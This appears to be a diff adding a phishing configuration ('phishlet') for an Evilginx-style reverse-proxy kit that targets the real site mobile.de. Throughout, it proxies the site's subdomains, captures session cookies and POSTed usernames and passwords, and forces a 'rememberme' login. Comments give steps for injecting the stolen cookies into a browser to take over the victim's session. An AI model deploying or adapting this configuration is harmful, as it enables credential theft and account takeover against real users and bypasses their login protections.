@@ -1,0 +1,84 @@
+author: '@An0nud4y' 
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'mobile.de', session: true, is_landing: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'classistatic.de', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'unpkg.com', session: true, is_landing: false}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'mobile.de', session: true, is_landing: false}
+  - {phish_sub: 'suchen', orig_sub: 'suchen', domain: 'mobile.de', session: true, is_landing: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'mobile.de', session: true, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.mobile.de', orig_sub: 'www', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mobile.de', orig_sub: 'www', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mobile.de', orig_sub: 'm', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mobile.de', orig_sub: 'm', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mobile.de', orig_sub: 'suchen', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mobile.de', orig_sub: 'suchen', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mobile.de', orig_sub: 'login', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mobile.de', orig_sub: 'login', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mobile.de', orig_sub: '', domain: 'unpkg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mobile.de', orig_sub: '', domain: 'unpkg.com', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mobile.de', orig_sub: 'static', domain: 'classistatic.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.mobile.de', orig_sub: 'static', domain: 'classistatic.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'login.mobile.de', orig_sub: 'www', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.mobile.de', orig_sub: 'www', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.mobile.de', orig_sub: 'm', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.mobile.de', orig_sub: 'm', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.mobile.de', orig_sub: 'suchen', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.mobile.de', orig_sub: 'suchen', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.mobile.de', orig_sub: 'login', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.mobile.de', orig_sub: 'login', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.mobile.de', orig_sub: '', domain: 'unpkg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.mobile.de', orig_sub: '', domain: 'unpkg.com', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.mobile.de', orig_sub: 'static', domain: 'classistatic.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.mobile.de', orig_sub: 'static', domain: 'classistatic.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'suchen.mobile.de', orig_sub: 'www', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'suchen.mobile.de', orig_sub: 'www', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'suchen.mobile.de', orig_sub: 'm', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'suchen.mobile.de', orig_sub: 'm', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'suchen.mobile.de', orig_sub: 'suchen', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'suchen.mobile.de', orig_sub: 'suchen', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'suchen.mobile.de', orig_sub: 'login', domain: 'mobile.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'suchen.mobile.de', orig_sub: 'login', domain: 'mobile.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'suchen.mobile.de', orig_sub: '', domain: 'unpkg.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'suchen.mobile.de', orig_sub: '', domain: 'unpkg.com', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'suchen.mobile.de', orig_sub: 'static', domain: 'classistatic.de', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'suchen.mobile.de', orig_sub: 'static', domain: 'classistatic.de', search: '{hostname}/', replace: '{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+auth_tokens:
+  - domain: '.mobile.de'
+    keys: ['a2SID', 'bm_mi', 'bm_sz', 'ak_bmsc','mdeConsentData','.*,regexp']  
+  - domain: 'login.mobile.de'
+    keys: ['GERMANY-CASTGC2','.*,regexp']  
+
+#GETTING SESSION
+# Inject Captured Cookies into browser
+# Goto suchen.mobile.de 
+# You Should have got the session, if not retry to inject cookies carefully with other methods
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/login'
+    search:
+      - {key: 'username'}
+      - {key: 'password'}
+    force:
+      - {key: 'rememberme', value: 'on'}
+    type: 'post'
+    
+login:
+  domain: 'login.mobile.de'
+  path: '/a2/login'
